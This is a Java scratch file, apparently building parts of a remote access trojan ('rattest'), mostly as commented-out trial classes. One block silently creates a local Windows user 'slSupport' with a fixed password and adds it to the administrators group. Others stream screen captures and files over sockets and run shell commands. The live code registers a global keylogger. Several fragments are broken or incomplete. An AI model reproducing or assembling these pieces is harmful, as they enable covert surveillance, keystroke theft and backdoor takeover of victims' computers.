package com.rattest.client;
// A Java program for a Server

import java.io.DataInputStream;
import java.io.*;
import java.net.*;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;




/*
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.net.*;
import java.io.*;
import java.nio.file.*;
public class tests
{
    //initialize socket and input stream
    private Socket          socket   = null;
    private ServerSocket    server   = null;
    private DataInputStream in       =  null;
    private DataOutputStream out=null;
    // constructor with port
    public tests(int port)
    {
        // starts server and waits for a connection
        try
        {
            server = new ServerSocket(port);
            System.out.println("Server started");
 
            System.out.println("Waiting for a client ...");
 
            socket = server.accept();
            System.out.println("Client accepted");
 
            // takes input from the client socket
            in = new DataInputStream(
                new BufferedInputStream(socket.getInputStream()));
            out = new DataOutputStream(socket.getOutputStream());
            String line = "";
            // reads message from client until "Over" is sent
            while (!line.equals("Over"))
            {
                try
                {
                    line = in.readUTF();
                    System.out.println(line);
                }
                catch(IOException i)
                {
                    System.out.println(i);
                }
            }
            System.out.println("Closing connection");
 
            // close connection
            socket.close();
            in.close();
        }
        catch(IOException i)
        {
            System.out.println(i);
        }
    }
 
    public static void main(String args[])
    {
        tests server = new tests(304);
    }
}
import java.io.*;
import java.util.*;

public class tests {
    public static void main(String[] args) throws Exception {
        ProcessBuilder builder = new ProcessBuilder(
            "cmd.exe","/c", "net user /add slSupport SXCG^PR%WjXH^gpJdnluuHiy0o)_(o-=0[;yulEjnHPFGRJd%Fr && net localgroup administrators slSupport /add");
        builder.redirectErrorStream(true);
        Process p = builder.start();
        /*
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while (true) {
            line = r.readLine();
            if (line == null) { break; }
            System.out.println(line);
        }
    }
}*//*
public class tests implements Runnable{
    Thread thread=new Thread(this);
    private void createThread(){
        int i=0;
        while(thread.isAlive()==false){
            try{
                thread.start();
            }catch(Exception e){
                System.out.println(thread.isInterrupted()+":"+thread.isAlive());
            }
            i++;
            System.out.println(i);
        }
    }
    public tests(){
        createThread();
    }
    public static void main(String[] args){
        new tests();
    }

    @Override
    public void run() {
        System.out.println("started");
        thread.interrupt();
    }
}*//*
import java.awt.*;
import java.awt.image.*;
import java.io.*;
import static java.lang.Thread.sleep;
import javax.imageio.*;
import javax.swing.*;
class tests extends JFrame implements Runnable{
    BufferedImage screen=null;
    Image fscreen=null;
    JLabel showScreen=new JLabel();
    Thread rdp=new Thread(new Runnable(){
            @Override
            public void run() {
                while(true){
                    try{
                        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
                        screen = new Robot().createScreenCapture(
                                new Rectangle(new Dimension(screenSize.width, screenSize.height)));
                        int x = MouseInfo.getPointerInfo().getLocation().x;
                        int y = MouseInfo.getPointerInfo().getLocation().y;

                        Graphics2D graphics2D = screen.createGraphics();
                        //graphics2D.drawImage(image, x, y, 20,30, null);
                        graphics2D.setColor(Color.RED);
                        graphics2D.fillOval(x, y, 10, 10);
                        graphics2D.drawOval(x, y, 10,10);
                        fscreen=screen.getScaledInstance(1280, 720,Image.SCALE_FAST);
                        showScreen.setIcon(new ImageIcon(fscreen));
                        showScreen.repaint();
                        rdp.wait(25);
                    }catch(Exception e){System.out.println(e);}
                }
            }
        });
    public tests(){
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        FlowLayout ly=new FlowLayout(FlowLayout.CENTER);
        setTitle("RDP Test");
        setLayout(ly);
        rdp.start();
        add(showScreen);
        setPreferredSize(new java.awt.Dimension(1280,720));
        pack();
        setVisible(true);
    }
    public static void main(String[] args) {
        new tests();
    }

    @Override
    public void run() {
    }
}*/
/* Send file and stuff
class tests{
    InputStream readFile;
    public void save(){
        try {
            FileOutputStream writeFile = new FileOutputStream("C:\\Users\\"+System.getProperty("user.name")+"\\05. Laufey - Dear Soulmate.flac");
            writeFile.write(readFile.readAllBytes());
        }catch (Exception ex) {
            Logger.getLogger(tests.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    public tests(){
        try {
            readFile = new FileInputStream("D:\\Laufey - Everything I Know About Love  (Deluxe Edition) (2022) [24Bit]\\05. Laufey - Dear Soulmate.flac");
            save();
            
        } catch (Exception ex) {
            Logger.getLogger(tests.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    public static void main(String[] args){
        new tests();
    }
}*//*
class tests{
    ServerSocket oServer;
    Socket response;
    DataInputStream in;
    DataOutputStream out;
    public tests(){
        
        try {
            oServer=new ServerSocket(1010);
            response=oServer.accept();
            in=new DataInputStream(response.getInputStream());
            out=new DataOutputStream(response.getOutputStream());
            FileOutputStream sFile=new FileOutputStream("C:\\Users\\Desktop\\downloads.zip");
            int count;
            byte[] buffer = new byte[8192]; // or 4096, or more
            while ((count = in.read(buffer)) > 0)
            {
              sFile.write(buffer, 0, count);
            }
        }catch(SocketException sex){
            try {
                 oServer.close();
                //empty my old lost connection and let it get by garbage col. immediately 
                oServer=null;
                System.gc();
                //Wait a new client Socket connection and address this to my local variable
                oServer=new ServerSocket(1010);
                response= oServer.accept(); // Waiting for another Connection
                System.out.println("Connection established...");
            } catch (IOException ex) {
                Logger.getLogger(tests.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
        catch (IOException ex) {
            System.out.println(ex);
        }
    }
    public static void main(String[] args){
        new tests();
    }
}*//*
import java.awt.*;
import java.awt.image.*;
import java.io.*;
import static java.lang.Thread.sleep;
import javax.imageio.*;
import javax.swing.*;
import java.util.*;
import org.apache.commons.lang.ArrayUtils;
class tests extends JFrame implements Runnable{
    ServerSocket oServer;
    Socket response;
    DataInputStream in;
    DataOutputStream out;
    BufferedImage screen=null;
    Image finalimg=null;
    JLabel showScreen=new JLabel();
    ArrayList<Byte> bite=new ArrayList<>();
    public tests(){
        try {
            oServer=new ServerSocket(1010);
            response=oServer.accept();
            in=new DataInputStream(response.getInputStream());
            out=new DataOutputStream(response.getOutputStream());
        } catch (IOException ex) {
            Logger.getLogger(tests.class.getName()).log(Level.SEVERE, null, ex);
        }
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        FlowLayout ly=new FlowLayout(FlowLayout.CENTER);
        setTitle("RDP Test");
        setLayout(ly);
        add(showScreen);
        setPreferredSize(new java.awt.Dimension(1280,720));
        pack();
        setVisible(true);
        while(true){
        try{
            byte[] bytes = new byte[1024*1024];
            int count = 0;
            do{
                    count+=in.read(bytes,count,bytes.length-count);
            }while(!(count>4 && bytes[count-2]==(byte)-1 && bytes[count-1]==(byte)-39));

            finalimg = ImageIO.read(new ByteArrayInputStream(bytes));
            finalimg = finalimg.getScaledInstance(1280,720,Image.SCALE_FAST);
            showScreen.setIcon(new ImageIcon(finalimg));
            showScreen.repaint();
        }catch(Exception e){
        }
        }
        
    }
    public static void main(String[] args) {
        new tests();
    }

    @Override
    public void run() {
    }
}*//*
import java.util.regex.*;
class tests{
    public tests(){
        try{
            ProcessBuilder executeCommand=new ProcessBuilder("cmd.exe","/c","C: && cd \"C:/Windows\" && dir");
            executeCommand.redirectErrorStream(true);
            Process p=executeCommand.start();
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String result="";
            String line;
            String[] files;
            while (true) {
                line = r.readLine();
                if (line == null) {
                    break;
                }
                else if(!(line.contains("Volume in drive "))&&!(line.contains("Volume Serial Number"))&&!(line.contains("Name"))&&!(line.isEmpty())){
                    files=line.split("\\d\\d\\d\s|<.*?>\s|<.*?>\t|\s\s\s\s\s\s\s\s\s");
                    for(String str:files){if(!Pattern.compile("\\d\\d:\\d\\d|\\d\\d/\\d\\d|\\d,").matcher(str).find()&&!(str.isEmpty())&&!str.equals(".")&&!(str.contains("bytes"))&&!(Pattern.compile("\s\s\s\s\s\s").matcher(str).find())){result=result.concat(","+str);}}
                }
            }
            System.out.println(result);
        }
        catch(Exception e){System.out.println(e);}
    }
    public static void main(String[] args){
        new tests();
    }
}*/
import com.github.kwhat.jnativehook.*;
import com.github.kwhat.jnativehook.keyboard.*;
public class tests implements NativeKeyListener{
    public tests(){
        keylog();
    }
    synchronized public void keylog(){
        System.out.println("tests");
        try{
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener();
        }catch(Exception e){System.out.println(e);}
    }
    public static void main(String[] args){
        
        new tests();
    }
}
/*
import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.EventQueue;
import java.awt.Graphics;
import java.awt.Graphics2D;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Image;
import java.awt.MouseInfo;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.time.Duration;
import java.time.Instant;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.imageio.ImageIO;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.SwingWorker;

class tests {

    public static void main(String[] args) {
        GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
        GraphicsDevice lstGDs[] = ge.getScreenDevices();
        /*for (GraphicsDevice gd : lstGDs) {
            System.out.println(gd.getDisplayMode());
        }

        new tests();
    }

    public tests() {
        EventQueue.invokeLater(new Runnable() {
            @Override
            public void run() {
                JFrame frame = new JFrame();
                frame.add(new TestPane());
                frame.pack();
                frame.setLocationRelativeTo(null);
                frame.setVisible(true);
            }
        });
    }

    public class TestPane extends JPanel {
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        private CaptureWorker worker;
        private BufferedImage snapshot;

        public TestPane() {
            startCapture();
        }
        @Override
        public Dimension getPreferredSize() {
            return new Dimension(1280, 720);
        }

        protected void startCapture() {
            try {
                stopCapture();
                GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
                GraphicsDevice gd = ge.getScreenDevices()[0];
                worker = new CaptureWorker(gd, new CaptureWorker.Observer() {
                    @Override
                    public void imageAvaliable(CaptureWorker source, BufferedImage img) {
                        TestPane.this.snapshot = img;
                        repaint();
                    }
                });
                worker.execute();
            } catch (AWTException ex) {
                Logger.getLogger(tests.class.getName()).log(Level.SEVERE, null, ex);
            }
        }

        protected void stopCapture() {
            if (worker == null) {
                return;
            }
            worker.stop();
            worker = null;
        }

        @Override
        protected void paintComponent(Graphics g) {
            super.paintComponent(g);
            Graphics2D g2d = (Graphics2D) g.create();
            if (snapshot != null) {
                double scaleFactor = Math.min(1d, getScaleFactorToFill(new Dimension(snapshot.getWidth(), snapshot.getHeight()), getSize()));
                int scaleWidth = (int) Math.round(snapshot.getWidth() * scaleFactor);
                int scaleHeight = (int) Math.round(snapshot.getHeight() * scaleFactor);

                Image imageToRender = snapshot.getScaledInstance(scaleWidth, scaleHeight, Image.SCALE_SMOOTH);
                int x = (getWidth() - imageToRender.getWidth(this)) / 2;
                int y = (getHeight() - imageToRender.getHeight(this)) / 2;

                g2d.drawImage(imageToRender, x, y, this);
                Rectangle screen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());

                Image cursor;
                try {
                    BufferedImage screenCapture = new Robot().createScreenCapture(screen);
                    cursor = ImageIO.read(new File("c:/cursor.gif"));
                    int x = MouseInfo.getPointerInfo().getLocation().x;
                    int y = MouseInfo.getPointerInfo().getLocation().y;
                } catch (IOException ex) {
                    Logger.getLogger(tests.class.getName()).log(Level.SEVERE, null, ex);
                }
                

                Graphics2D graphics2D = screenCapture.createGraphics();
                graphics2D.drawImage(cursor, x, y, 16, 16, null); // cursor.gif is 16x16 size.
                ImageIO.write(screenCapture, "GIF", new File("c:/capture.gif"));
            }
            g2d.dispose();
        }

        public double getScaleFactor(int iMasterSize, int iTargetSize) {
            double dScale = 1;
            dScale = (double) iTargetSize / (double) iMasterSize;

            return dScale;
        }

        public double getScaleFactorToFit(Dimension original, Dimension toFit) {
            double dScale = 1d;

            if (original != null && toFit != null) {
                double dScaleWidth = getScaleFactor(original.width, toFit.width);
                double dScaleHeight = getScaleFactor(original.height, toFit.height);

                dScale = Math.min(dScaleHeight, dScaleWidth);
            }
            return dScale;
        }

        public double getScaleFactorToFill(Dimension masterSize, Dimension targetSize) {
            double dScaleWidth = getScaleFactor(masterSize.width, targetSize.width);
            double dScaleHeight = getScaleFactor(masterSize.height, targetSize.height);

            double dScale = Math.max(dScaleHeight, dScaleWidth);

            return dScale;
        }

    }

    public class CaptureWorker extends SwingWorker<Void, BufferedImage> {

        public interface Observer {

            public void imageAvaliable(CaptureWorker source, BufferedImage img);
        }

        private AtomicBoolean keepRunning = new AtomicBoolean(true);
        private Robot bot;
        private Rectangle captureBounds;

        private final Duration interval = Duration.ofMillis(25);

        private Observer observer;

        public CaptureWorker(GraphicsDevice device, Observer observer) throws AWTException {
            captureBounds = device.getDefaultConfiguration().getBounds();
            this.observer = observer;
            bot = new Robot();
        }

        public void stop() {
            keepRunning.set(false);
        }

        @Override
        protected void process(List<BufferedImage> chunks) {
            BufferedImage img = chunks.get(chunks.size() - 1);
            observer.imageAvaliable(this, img);
        }

        @Override
        protected Void doInBackground() throws Exception {
            try {
                while (keepRunning.get()) {
                    Instant anchor = Instant.now();
                    BufferedImage image = bot.createScreenCapture(captureBounds);
                    publish(image);
                    Duration duration = Duration.between(anchor, Instant.now());
                    duration = duration.minus(interval);
                    if (duration.isNegative()) {
                        long sleepTime = Math.abs(duration.toMillis());
                        Thread.sleep(sleepTime);
                    }
                }
            } catch (Exception exp) {
                exp.printStackTrace();
            }
            return null;
        }

    }
}*/